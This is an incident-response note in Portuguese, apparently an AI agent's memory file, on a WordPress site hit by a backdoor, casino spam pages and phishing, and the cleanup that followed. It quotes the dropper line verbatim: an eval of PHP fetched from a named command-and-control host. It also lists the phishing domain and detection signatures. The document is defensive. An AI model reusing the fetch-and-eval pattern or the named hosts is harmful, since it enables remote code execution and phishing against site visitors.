---
name: reference_incidente_euvo_backdoor
description: "euvo.com.br invadido (abr–jul/2026): backdoor eval-remoto em languages/plugins/lib/indexx.php + pastas físicas sombreando slugs do WP com spam de cassino. Limpo 2026-07-15. Vetor inicial NÃO identificado."
metadata:
  node_type: memory
  type: reference
  originSessionId: 275c97d9-ef2f-4298-a595-74a3b5880cd9
---

**Incidente euvo.com.br (vps1) — comprometido 2026-04-04, descoberto/limpo 2026-07-15 (~3 meses no ar).**

**Backdoor (persistência):** `wp-content/languages/plugins/lib/indexx.php` (483 B) →
```php
eval("?>" . getURL("https://gas-lagi.xyz/raw/a1/raw11"));
```
Dropper de **execução remota**: baixa PHP do C2 e executa a cada acesso. Acompanhado de `.htaccess` na mesma pasta (`RewriteEngine Off` + `Require all granted` p/ .php/.html/.xml) pra ser alcançável direto por URL.

**Payload (spam):** 3 **pastas físicas** criadas no web root com **slugs de páginas reais do WP** (`equipe/`, `contato/`, `termos-de-uso/`) — a pasta física **sombreia** a página do WP e o servidor serve o `index.php` plantado (500–660 KB): clone estático do **Booking.com** com spam de cassino indonésio ("NUVO77 : Situs Slot Gacor…", `countryCode: id`) + **phishing** (`loginan-terbaik-sekarang.pages.dev`). Plantaram também `google21fb4972685e4cd8.html` (verificação do Search Console) p/ verificar o domínio **no GSC do atacante**.

**Por que em `languages/`:** o `.htaccess` da raiz do euvo já era bem endurecido (bloqueia PHP em uploads, `open_basedir`, xmlrpc negado) — então usaram uma pasta não coberta.

**Limpeza aplicada (2026-07-15):** removidos backdoor + 3 pastas + arquivos GSC; criado `wp-content/languages/.htaccess` negando PHP; cache purgado; páginas legítimas restauradas (verificado). Backup forense: `scratchpad/euvo-malware-forense.tar.gz` (381 KB).

**Escopo:** varredura em vps1/anderson/qmix = **LIMPOS** (0 dropper, 0 assinatura `gas-lagi.xyz`, 0 pasta anômala em languages/). PHP em uploads encontrados são legítimos de plugin (index.php em branco, AIOS `settings.php` com `__halt_compiler()`, wpallexport). Isolado ao euvo.

⚠️ **VETOR INICIAL NÃO IDENTIFICADO** — removi a persistência, não sei como entraram em 04/abr. **PENDENTE (exige o operador):** rotacionar senhas (painel Hostinger, FTP/SSH, admin WP `suporte`), atualizar WP+plugins (seopress 10.0.1, xml-sitemap-feed 5.7.7, litespeed 7.8.1, wordfence 8.2.2, bramble-press-contact 1.2.0), rodar scan do Wordfence (estava instalado e NÃO pegou), e no Search Console remover o proprietário/verificação do atacante + checar ação manual.

**Assinaturas p/ caçar isso de novo na rede:** pasta física no web root com `index.php` >100 KB fora do WP; `google*.html` dentro de subpasta (verificação plantada); pasta estranha dentro de `wp-content/languages/`; `eval("?>"` + `curl` num PHP curto.
